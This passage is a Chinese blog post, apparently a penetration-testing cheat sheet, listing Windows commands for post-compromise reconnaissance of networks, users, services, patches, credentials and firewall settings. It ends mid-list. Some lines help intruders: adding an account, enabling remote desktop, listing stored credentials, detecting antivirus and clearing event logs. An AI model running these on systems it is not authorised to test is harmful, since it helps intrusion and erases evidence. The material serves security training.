<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>内网渗透-Windows信息收集 | BaiKer</title><meta name="keywords" content="内网渗透,信息收集"><meta name="author" content="BaiKer"><meta name="copyright" content="BaiKer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本地信息收集查询网络配置查询网络配置 12ipconfigipconfig &#x2F;all  ARP表 1arp -a  路由表 12route printnetstat -r  DNS缓存 12ipconfig &#x2F;displaydnsGet-CimInstance -Namespace root&#x2F;StandardCimv2 -ClassName MSFT_DNSClientCache    查询用户列">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透-Windows信息收集">
<meta property="og:url" content="http://baiker.top/a7b4e7b158e4.html">
<meta property="og:site_name" content="BaiKer">
<meta property="og:description" content="本地信息收集查询网络配置查询网络配置 12ipconfigipconfig &#x2F;all  ARP表 1arp -a  路由表 12route printnetstat -r  DNS缓存 12ipconfig &#x2F;displaydnsGet-CimInstance -Namespace root&#x2F;StandardCimv2 -ClassName MSFT_DNSClientCache    查询用户列">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://baiker.top/img/wallhaven-gj977q.png">
<meta property="article:published_time" content="2021-09-23T05:40:29.000Z">
<meta property="article:modified_time" content="2021-11-22T08:29:19.381Z">
<meta property="article:author" content="BaiKer">
<meta property="article:tag" content="内网渗透">
<meta property="article:tag" content="信息收集">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baiker.top/img/wallhaven-gj977q.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://baiker.top/a7b4e7b158e4"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"TWYY6OLZHR","apiKey":"55f52a4f27b68086a202f7f911366f0d","indexName":"boke","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内网渗透-Windows信息收集',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-11-22 16:29:19'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="referrer" content="no-referrer" /><link rel="stylesheet" href="https://baiker.top/css/essay.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.css"/><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">65</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">52</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/essay"><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://baiker.top/img/wallhaven-gj977q.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">BaiKer</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/essay"><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透-Windows信息收集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-23T05:40:29.000Z" title="发表于 2021-09-23 13:40:29">2021-09-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-11-22T08:29:19.381Z" title="更新于 2021-11-22 16:29:19">2021-11-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透-Windows信息收集"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h2><h3 id="查询网络配置"><a href="#查询网络配置" class="headerlink" title="查询网络配置"></a>查询网络配置</h3><p>查询网络配置</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p>ARP表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp <span class="literal">-a</span></span><br></pre></td></tr></table></figure>

<p>路由表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">netstat <span class="literal">-r</span></span><br></pre></td></tr></table></figure>

<p>DNS缓存</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /displaydns</span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> root/StandardCimv2 <span class="literal">-ClassName</span> MSFT_DNSClientCache</span><br></pre></td></tr></table></figure>



<h3 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h3><p>查看用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前组的所有用户</span></span><br><span class="line">net user</span><br><span class="line">net user xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户以及所属组</span></span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户的特权信息</span></span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有的组和特权信息</span></span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前所有的用户名</span></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前组的所有用户的详细信息</span></span><br><span class="line">wmic useraccount get /ALL /format:csv</span><br></pre></td></tr></table></figure>



<p>查看当前用户的权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<p>添加用户</p>
<p>会被杀软拦截</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /add xxx <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p>删除用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /delete xxx</span><br></pre></td></tr></table></figure>



<p>查看用户登录远程桌面状态信息</p>
<p>查看用户是否在线</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br><span class="line">quser net config workstation</span><br></pre></td></tr></table></figure>



<p>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config Workstation</span><br></pre></td></tr></table></figure>



<p>ACL 信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-acl</span></span><br></pre></td></tr></table></figure>



<h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><p>查看进程信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出每个进程的所有服务信息</span></span><br><span class="line">tasklist /svc</span><br><span class="line">wmic <span class="keyword">process</span> list brief</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有进程的DLL模块</span></span><br><span class="line">tasklist /m</span><br><span class="line"></span><br><span class="line"><span class="comment"># powershell命令，获取计算机上运行的所有进程</span></span><br><span class="line"><span class="built_in">get-process</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每个进程的详细信息</span></span><br><span class="line">wmic <span class="keyword">process</span> list full</span><br><span class="line">wmic <span class="keyword">process</span> get caption,executablepath,commandline /format:csv</span><br></pre></td></tr></table></figure>



<p>查看正在运行的进程信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只能cmd使用</span></span><br><span class="line">wmic startup get command ,caption</span><br></pre></td></tr></table></figure>



<h3 id="查询服务信息"><a href="#查询服务信息" class="headerlink" title="查询服务信息"></a>查询服务信息</h3><p>查看服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<p>查看所有服务的详细信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> query</span><br></pre></td></tr></table></figure>

<p>查看所有服务的路径以及运行参数</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">select</span> PathName</span><br></pre></td></tr></table></figure>

<p>查看已经启动的服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">start</span></span><br></pre></td></tr></table></figure>



<h3 id="查询操作系统"><a href="#查询操作系统" class="headerlink" title="查询操作系统"></a>查询操作系统</h3><p>查看主机名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>



<p>查看操作系统版本信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure>



<p>查看系统配置信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>



<p>查看所有环境变量</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 仅cmd下运行</span></span><br><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>



<p>查看计划任务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">schtasks /QUERY /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果出错，先把编码改为英文，然后再改回来</span></span><br><span class="line">chcp <span class="number">437</span></span><br><span class="line">chcp <span class="number">936</span></span><br></pre></td></tr></table></figure>



<p>查看安装的所有驱动</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRIVERQUERY</span><br></pre></td></tr></table></figure>



<p>查看引导配置数据 (BCD) 文件</p>
<p>相当于boot.ini文件</p>
<p>需要管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit</span><br></pre></td></tr></table></figure>



<p>架构和系统名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 仅CMD下运行,输出系统架构</span></span><br><span class="line"><span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%</span><br><span class="line"></span><br><span class="line">wmic os get osarchitecture</span><br><span class="line">wmic os get caption</span><br></pre></td></tr></table></figure>



<p>查看系统盘符</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logicaldisk get caption</span><br></pre></td></tr></table></figure>



<p>查看开机时间</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>



<h3 id="查询软件信息"><a href="#查询软件信息" class="headerlink" title="查询软件信息"></a>查询软件信息</h3><p>查看安装的软件信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有的软件以及版本信息</span></span><br><span class="line">wmic product get name,version</span><br><span class="line">powershell <span class="string">&quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span></span><br></pre></td></tr></table></figure>



<p>查看杀软</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list</span><br></pre></td></tr></table></figure>



<h3 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h3><p>监听的端口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span></span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>端口信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetTCPConnection</span></span><br></pre></td></tr></table></figure>

<p>探测每个端口出网情况</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;1..65535 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#x27;allports.exposed&#x27;,<span class="variable">$_</span>)) <span class="variable">$_</span> &#125; 2&gt;<span class="variable">$null</span>&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="查询补丁列表"><a href="#查询补丁列表" class="headerlink" title="查询补丁列表"></a>查询补丁列表</h3><p>查看补丁信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get descrveription,installedOn /format:csv</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<p>查询补丁详细信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list full</span><br></pre></td></tr></table></figure>



<h3 id="查询本机共享"><a href="#查询本机共享" class="headerlink" title="查询本机共享"></a>查询本机共享</h3><p>查看共享信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>



<h3 id="查询代理信息"><a href="#查询代理信息" class="headerlink" title="查询代理信息"></a>查询代理信息</h3><p>查看代理配置信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\windows\Currentversion\Internet Settings&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="查询远程连接服务"><a href="#查询远程连接服务" class="headerlink" title="查询远程连接服务"></a>查询远程连接服务</h3><p>查询远程桌面的注册表信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询该路径下所有的子项和值</span></span><br><span class="line">REG query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询远程桌面端口</span></span><br><span class="line"><span class="comment"># 查询该路径下portnumber的值</span></span><br><span class="line"><span class="comment"># 如果值是数字，则所有的值都是十六进制，以0x开头</span></span><br><span class="line">REG query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v portnumber</span><br></pre></td></tr></table></figure>

<p>开启远程链接服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting <span class="built_in">WHERE</span> (__CLASS !=<span class="string">&quot;&quot;</span>) CALL SetAllowTSConnections <span class="number">1</span></span><br></pre></td></tr></table></figure>



<h3 id="查询票据信息"><a href="#查询票据信息" class="headerlink" title="查询票据信息"></a>查询票据信息</h3><p>查看远程桌面连接历史记录</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure>

<p>显示当前缓存的 Kerberos 票证的列表</p>
<p>必须是<strong>域管理员</strong> 或等效的 才能运行此命令的所有参数</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>



<h3 id="查询日志信息"><a href="#查询日志信息" class="headerlink" title="查询日志信息"></a>查询日志信息</h3><p>wevtutil命令说明</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/wevtutil">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/wevtutil</a></p>
<p>列出所有的日志名称</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el</span><br><span class="line">wevtutil <span class="class"><span class="keyword">enum</span>-<span class="title">logs</span></span></span><br></pre></td></tr></table></figure>

<p>获取日志配置信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wevtutil <span class="built_in">gl</span> xxx</span><br><span class="line">wevtutil <span class="built_in">get-log</span> xxx</span><br></pre></td></tr></table></figure>

<p>修改日志配置信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wevtutil <span class="built_in">sl</span> xxx</span><br><span class="line">wevtutil <span class="built_in">set-log</span> xxx</span><br></pre></td></tr></table></figure>

<p>从日志中查询事件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe xxx</span><br><span class="line"><span class="comment"># 读取应用程序中最新的三个事件，以文本格式显示</span></span><br><span class="line">wevtutil qe Application /c:<span class="number">3</span> /<span class="built_in">rd</span>:true /f:text</span><br></pre></td></tr></table></figure>

<p>清除日志</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl</span><br><span class="line">wevtutil <span class="built_in">clear-log</span></span><br></pre></td></tr></table></figure>

<p>打开事件查看器</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eventvwr</span><br></pre></td></tr></table></figure>



<h3 id="查询防火墙配置"><a href="#查询防火墙配置" class="headerlink" title="查询防火墙配置"></a>查询防火墙配置</h3><p>查看防火墙配置</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示所有配置文件的属性（全局,域配置,专用配置,公用配置）</span></span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示活动配置文件的属性</span></span><br><span class="line">netsh advfirewall show currentprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示域配置文件的属性</span></span><br><span class="line">netsh advfirewall show domainprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示全局属性</span></span><br><span class="line">netsh advfirewall show global</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示专用配置文件的属性</span></span><br><span class="line">netsh advfirewall show privateprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 